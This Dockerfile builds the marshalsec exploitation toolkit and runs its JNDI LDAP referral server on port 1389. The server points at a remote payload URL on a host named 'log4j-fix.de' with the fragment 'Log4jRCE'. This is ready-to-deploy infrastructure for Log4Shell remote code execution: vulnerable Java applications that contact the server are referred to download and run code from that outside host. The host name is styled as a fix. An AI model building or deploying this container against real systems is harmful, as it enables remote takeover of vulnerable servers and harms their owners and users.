FROM maven:3-jdk-11 as builder
RUN mkdir /build && cd build; git clone https://github.com/mbechler/marshalsec && cd marshalsec
RUN cd /build/marshalsec && mvn package -DskipTests

FROM adoptopenjdk:11
RUN useradd app -d /app
WORKDIR /app
USER app
COPY --from=builder /build/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar /app
CMD ["java", "-cp", "/app/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "https://log4j-fix.de/#Log4jRCE", "1389"]
